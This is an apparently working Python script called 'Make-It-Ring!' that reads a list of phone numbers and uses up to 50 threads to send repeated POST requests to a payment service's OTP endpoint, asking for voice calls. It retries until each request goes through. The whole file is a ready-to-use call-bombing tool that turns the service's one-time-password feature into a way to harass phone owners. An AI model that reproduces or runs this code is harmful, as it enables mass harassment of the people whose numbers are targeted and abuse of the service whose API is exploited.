print("""\
   __  __________  __
  /  |/  /  _/ _ \/ / | Make-It-Ring!
 / /|_/ // // , _/_/  | Author: P4kL0nc4t
/_/  /_/___/_/|_(_)   | https://github.com/p4kl0nc4t
""")
import thread
import requests
import sys
requests.packages.urllib3.disable_warnings()
try:
    file = sys.argv[1]
except:
    print("usage: {} <numbers_list>".format(sys.argv[0]))
    sys.exit()
numbers = open(sys.argv[1], "r").readlines()
count = 0
processc = 0
running_threads = 0
print_used = False
max_threads = 50
def trim_ident(ident):
    ident_l = len(str(ident))
    if ident_l % 2 == 0:
        return str(ident)
    else:
        return str(ident)[:ident_l-1]
def prinfo(string):
    thread_idlen = len(str(trim_ident(thread.get_ident())))+2
    dash_c = thread_idlen-(len(string)+2)
    dashes = (dash_c/2)*"-"
    return "["+dashes+"|"+string+"|"+dashes+"]"
print(prinfo("info")+": read {} numbers from {}".format(len(numbers), file))
def process(number):
    global running_threads
    global processc
    global print_used
    running_threads += 1
    number = number.rstrip()
    url = "https://www.tokocash.com/oauth/otp"
    data = {"msisdn": number.rstrip(), "accept": "call"}
    headers = {"X-Requested-With": "XMLHttpRequest"}
    temp_code = "500001"
    while temp_code == "500001":
        r = requests.post(url, data=data, headers=headers, verify=False)
        while print_used:
            pass
        temp_code = r.json()['code']
    print_used = True
    print("\r[0x" + str(trim_ident(thread.get_ident())) + "]: " + number + " (status: " + 
r.json()['code'] + ")")
    print_used = False
    processc += 1
    running_threads -= 1
    return 1
for number in numbers:
    while running_threads >= max_threads:
        pass
    if number == "" or number[0] == ";": continue
    count += 1
    thread.start_new_thread(process, ( number, ))
while processc != count:
    pass
print(prinfo("done")+": done all jobs! exiting . . .")
sys.exit()
